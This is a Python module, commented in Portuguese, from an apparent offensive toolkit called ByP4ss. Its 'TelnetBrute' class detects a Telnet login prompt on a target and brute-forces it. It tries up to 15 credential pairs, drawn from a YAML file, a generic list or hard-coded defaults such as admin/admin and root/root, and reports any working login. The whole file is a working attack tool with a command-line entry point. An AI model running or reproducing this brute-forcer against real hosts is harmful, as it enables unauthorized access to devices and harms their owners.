# TelnetBrute do ByP4ss
# Brute force contextual no Telnet, usando CredLoader (YAML) + K1ELI.
# Chamado por Core.Engine.Bypass: Mod.TelnetBrute.Tentar(Alvo, Porta)
#
# Estrategia:
#   1. Conecta, le banner. Se nao tem "login:"/"Password:", nao e Telnet.
#   2. Carrega credenciais do YAML do alvo, senao K1ELI generico.
#   3. Tenta ate 15 credenciais (limite pra nao travar o --all).
#   4. Se logar, retorna {ok: True, user, pass}. NAO abre shell.
#
# Seguranca: so socket. Nenhum comando executa.

import socket
import time

from Core.Config import Config
from Core.Log import Log


class TelnetBrute:

    PORTA_PADRAO = 23
    TIMEOUT_CONEXAO = 2.0
    TIMEOUT_LEITURA = 1.5
    MAX_TENTATIVAS = 15
    PROMPTS_LOGIN = (b"login:", b"Login:", b"LOGIN:", b"Username:", b"username:", b"user:")
    PROMPTS_SENHA = (b"Password:", b"password:", b"PASS:", b"pass:")
    SINAIS_OK = (b"#", b"$", b">", b"ok", b"success", b"welcome", b"logged")
    SINAIS_FALHA = (b"incorrect", b"fail", b"error", b"denied", b"invalid")

    @staticmethod
    def Tentar(Alvo, Porta=None):
        Porta = int(Porta or TelnetBrute.PORTA_PADRAO)
        Resultado = {
            "ok": False,
            "alvo": Alvo,
            "porta": Porta,
            "motivo": "",
            "user": None,
            "pass": None,
            "tentativas": 0,
        }
        if not Alvo:
            Resultado["motivo"] = "alvo_ausente"
            return Resultado
        Banner = TelnetBrute._LerBanner(Alvo, Porta)
        if Banner is None:
            Resultado["motivo"] = "conexao_falhou"
            return Resultado
        if not TelnetBrute._PareceTelnet(Banner):
            Resultado["motivo"] = "nao_e_telnet"
            Resultado["banner"] = Banner[:120].decode("utf-8", errors="replace")
            return Resultado
        Credenciais = TelnetBrute._CarregarCredenciais(Alvo)
        if not Credenciais:
            Resultado["motivo"] = "sem_credenciais"
            return Resultado
        Credenciais = Credenciais[:TelnetBrute.MAX_TENTATIVAS]
        Log.Info("telnetbrute iniciado", {
            "alvo": Alvo, "porta": Porta, "credenciais": len(Credenciais),
        })
        for I, (User, Pass) in enumerate(Credenciais):
            Resultado["tentativas"] = I + 1
            if TelnetBrute._TentarLogin(Alvo, Porta, User, Pass):
                Resultado["ok"] = True
                Resultado["user"] = User
                Resultado["pass"] = Pass
                Log.Bypass("TelnetBrute", Alvo, True, {
                    "porta": Porta, "user": User,
                })
                return Resultado
        Resultado["motivo"] = "todas_falharam"
        Log.Bypass("TelnetBrute", Alvo, False, {"porta": Porta,
                                                 "tentativas": Resultado["tentativas"]})
        return Resultado

    @staticmethod
    def _LerBanner(Alvo, Porta):
        Sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Sock.settimeout(TelnetBrute.TIMEOUT_CONEXAO)
        try:
            if Sock.connect_ex((Alvo, int(Porta))) != 0:
                return None
            Sock.settimeout(TelnetBrute.TIMEOUT_LEITURA)
            try:
                Banner = Sock.recv(1024)
            except socket.timeout:
                Banner = b""
            if not Banner:
                try:
                    Sock.sendall(b"\r\n")
                    Banner = Sock.recv(1024)
                except (socket.timeout, OSError):
                    Banner = b""
            return Banner
        except (socket.error, OSError):
            return None
        finally:
            try:
                Sock.close()
            except (socket.error, OSError):
                pass

    @staticmethod
    def _PareceTelnet(Banner):
        if not Banner:
            return False
        Baixo = Banner.lower()
        if any(P in Banner for P in TelnetBrute.PROMPTS_LOGIN):
            return True
        if any(P in Banner for P in TelnetBrute.PROMPTS_SENHA):
            return True
        if b"telnet" in Baixo:
            return True
        return False

    @staticmethod
    def _TentarLogin(Alvo, Porta, User, Pass):
        Sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Sock.settimeout(TelnetBrute.TIMEOUT_CONEXAO)
        try:
            if Sock.connect_ex((Alvo, int(Porta))) != 0:
                return False
            Sock.settimeout(TelnetBrute.TIMEOUT_LEITURA)
            try:
                Sock.recv(1024)
            except socket.timeout:
                pass
            try:
                Sock.sendall((User + "\r\n").encode())
                time.sleep(0.3)
                try:
                    Sock.recv(512)
                except socket.timeout:
                    pass
                Sock.sendall((Pass + "\r\n").encode())
                time.sleep(0.3)
                try:
                    Resp = Sock.recv(1024)
                except socket.timeout:
                    Resp = b""
            except (socket.timeout, OSError):
                return False
            if not Resp:
                return False
            if any(S in Resp.lower() for S in TelnetBrute.SINAIS_FALHA):
                return False
            if any(S in Resp for S in TelnetBrute.SINAIS_OK):
                return True
            return False
        except (socket.error, OSError):
            return False
        finally:
            try:
                Sock.close()
            except (socket.error, OSError):
                pass

    @staticmethod
    def _CarregarCredenciais(Alvo):
        Credenciais = []
        try:
            from ExploitByp4ss.CredLoader import CredLoader
            import os as OsMod
            Caminho = OsMod.path.join(
                OsMod.path.dirname(OsMod.path.dirname(OsMod.path.abspath(__file__))),
                "ExploitByp4ss", "credenciais.yaml")
            if OsMod.path.isfile(Caminho):
                R = CredLoader.Carregar(Caminho)
                if R.get("ok"):
                    for C in (CredLoader.Buscar(R["dados"], Alvo) or []):
                        U = C.get("user", "")
                        P = C.get("pass", "")
                        if U:
                            Credenciais.append((U, P))
        except Exception:
            pass
        if not Credenciais:
            try:
                from Tools.K1ELI.Base.Credenciais import BASE as K1Base
                for U, P in K1Base.get("generico", []):
                    Credenciais.append((U, P))
            except Exception:
                pass
        if not Credenciais:
            Credenciais = [
                ("admin", "admin"), ("admin", "password"), ("admin", ""),
                ("root", "root"), ("root", "admin"), ("root", ""),
                ("user", "user"), ("guest", "guest"),
            ]
        Vistos = set()
        Unicos = []
        for U, P in Credenciais:
            Chave = (U, P)
            if Chave in Vistos:
                continue
            Vistos.add(Chave)
            Unicos.append((U, P))
        return Unicos

    @staticmethod
    def Info():
        return {
            "nome": "TelnetBrute",
            "porta_padrao": TelnetBrute.PORTA_PADRAO,
            "max_tentativas": TelnetBrute.MAX_TENTATIVAS,
            "abre_shell": False,
        }


if __name__ == "__main__":
    import sys, json
    if len(sys.argv) > 2 and sys.argv[1] == "teste":
        Alvo = sys.argv[2]
        Porta = int(sys.argv[3]) if len(sys.argv) > 3 else 23
        print(f"telnetbrute {Alvo}:{Porta}")
        R = TelnetBrute.Tentar(Alvo, Porta)
        print(json.dumps(R, indent=2, ensure_ascii=False, default=str))
